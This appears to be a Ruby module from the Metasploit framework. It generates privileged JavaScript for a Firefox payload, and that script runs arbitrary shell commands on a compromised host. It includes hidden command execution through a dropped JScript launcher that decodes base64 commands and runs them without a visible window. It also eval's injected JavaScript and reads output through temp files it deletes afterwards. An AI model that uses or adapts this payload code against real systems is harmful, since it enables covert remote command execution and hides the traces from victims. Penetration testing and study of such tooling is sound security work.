# -*- coding: binary -*-
require 'msf/core'
require 'json'

module Msf::Payload::Firefox

  # Javascript source code of readFile(path) - synchronously reads a file and returns
  # its contents. The file is deleted immediately afterwards.
  #
  # @return [String] javascript source code that exposes the readFile(path) method
  def read_file_source
    %Q|
      var readFile = function(path) {
        try {
          var file = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);
          file.initWithPath(path);

          var fileStream = Components.classes["@mozilla.org/network/file-input-stream;1"]
                           .createInstance(Components.interfaces.nsIFileInputStream);
          fileStream.init(file, 1, 0, false);

          var binaryStream = Components.classes["@mozilla.org/binaryinputstream;1"]
                             .createInstance(Components.interfaces.nsIBinaryInputStream);
          binaryStream.setInputStream(fileStream);
          var array = binaryStream.readByteArray(fileStream.available());

          binaryStream.close();
          fileStream.close();
          file.remove(true);

          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join("");
        } catch (e) { return ""; }
      };
    |
  end

  # Javascript source code of runCmd(str,cb) - runs a shell command on the OS
  #
  # Because of a limitation of firefox, we cannot retrieve the shell output
  # so the stdout/err are instead redirected to a temp file, which is read and
  # destroyed after the command completes.
  #
  # On posix, the command is double wrapped in "/bin/sh -c" calls, the outer of
  # which redirects stdout.
  #
  # On windows, the command is wrapped in two "cmd /c" calls, the outer of which
  # redirects stdout. A JScript "launch" file is dropped and invoked with wscript
  # to run the command without displaying the cmd.exe prompt.
  #
  # When the command contains the pattern "[JAVASCRIPT] ... [/JAVASCRIPT]", the
  # javascript code between the tags is eval'd and returned.
  #
  # @return [String] javascript source code that exposes the runCmd(str) method.
  def run_cmd_source
    %Q|
      var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
      var windows = (ua.indexOf("Windows")>-1);
      var svcs = Components.utils.import("resource://gre/modules/Services.jsm");
      var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
      var runCmd = function(cmd, cb) {
        if (cmd.trim().length == 0) return;

        var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());
        if (js) {
          var tag = "[!JAVASCRIPT]";
          Function('send', js[1])(function(r){ if (r) cb(r+tag+"\\n"); });
          return;
        }

        var shEsc = "\\\\$&";
        var shPath = "/bin/sh -c"

        if (windows) {
          shPath = "cmd /c";
          shEsc = "\\^$&";
          var jscriptFile = Components.classes["@mozilla.org/file/directory_service;1"]
            .getService(Components.interfaces.nsIProperties)
            .get("TmpD", Components.interfaces.nsIFile);
          jscriptFile.append('#{Rex::Text.rand_text_alphanumeric(8+rand(12))}.js');
          var stream = Components.classes["@mozilla.org/network/safe-file-output-stream;1"]
            .createInstance(Components.interfaces.nsIFileOutputStream);
          stream.init(jscriptFile, 0x04 \| 0x08 \| 0x20, 0666, 0);
          stream.write(jscript, jscript.length);
          if (stream instanceof Components.interfaces.nsISafeOutputStream) {
            stream.finish();
          } else {
            stream.close();
          }
        }

        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";

        var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stdout.append(stdoutFile);

        if (windows) {
          var shell = shPath+" "+cmd;
          shell = shPath+" "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>&1";
          var b64 = svcs.btoa(shell);
        } else {
          var shell = shPath+" "+cmd.replace(/\\W/g, shEsc);
          shell = shPath+" "+shell.replace(/\\W/g, shEsc) + " >"+stdout.path+" 2>&1";
        }
        var process = Components.classes["@mozilla.org/process/util;1"]
          .createInstance(Components.interfaces.nsIProcess);
        var sh = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);

        if (windows) {
          sh.initWithPath("C:\\\\Windows\\\\System32\\\\wscript.exe");
          process.init(sh);
          var args = [jscriptFile.path, b64];
          process.run(true, args, args.length);
          jscriptFile.remove(true);
          cb(cmd+"\\n"+readFile(stdout.path));
        } else {
          sh.initWithPath("/bin/sh");
          process.init(sh);
          var args = ["-c", shell];
          process.run(true, args, args.length);
          cb(readFile(stdout.path));
        }
      };
    |
  end

  # This file is dropped on the windows platforms to a temp file in order to prevent the
  # cmd.exe prompt from appearing. It is executed and then deleted.
  #
  # @return [String] JScript that reads its command-line argument, decodes
  # base64 and runs it as a shell command.
  def jscript_launcher
    %Q|
      var b64 = WScript.arguments(0);
      var dom = new ActiveXObject("MSXML2.DOMDocument.3.0");
      var el  = dom.createElement("root");
      el.dataType = "bin.base64"; el.text = b64; dom.appendChild(el);
      var stream = new ActiveXObject("ADODB.Stream");
      stream.Type=1; stream.Open(); stream.Write(el.nodeTypedValue);
      stream.Position=0; stream.type=2; stream.CharSet = "us-ascii"; stream.Position=0;
      var cmd = stream.ReadText();
      (new ActiveXObject("WScript.Shell")).Run(cmd, 0, true);
    |
  end
end
